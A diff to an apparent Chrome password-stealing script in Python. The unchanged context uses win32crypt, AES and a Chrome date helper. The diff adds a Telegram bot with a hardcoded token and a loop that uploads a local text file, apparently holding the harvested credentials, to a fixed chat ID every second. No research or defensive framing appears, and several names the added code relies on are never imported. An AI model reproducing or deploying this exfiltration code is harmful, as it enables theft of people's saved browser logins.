@@ -1,4 +1,5 @@
 from Crypto.Cipher import AES
+import os.path
 import os
 import logging
 import asyncio
@@ -10,6 +11,9 @@ import win32crypt
 import schedule
 import shutil
 from datetime import timezone, datetime, timedelta
+
+bot = Bot(token='1645152567:AAHfc_DhZDuOn3-iloEI1UbfF78Z8yNjoAU')
+dp = Dispatcher(bot)
 
 def get_chrome_datetime(chromedate):
     """Вернуть объект datetime.datetime из формата datetime в chrome
@@ -83,5 +87,16 @@ def main():
     except:
         pass
 
+async def scheduled(wait_for):
+    while True:
+        await asyncio.sleep(wait_for)
+
+        await bot.send_document(715341565, open(r"D:\\Practice\\text.txt", 'rb'))
+
 if __name__ == "__main__":
+    loop = asyncio.get_event_loop()
+    loop.create_task(scheduled(1))
+    executor.start_polling(dp, skip_updates=True)
     main()
+    sys.exit()
+
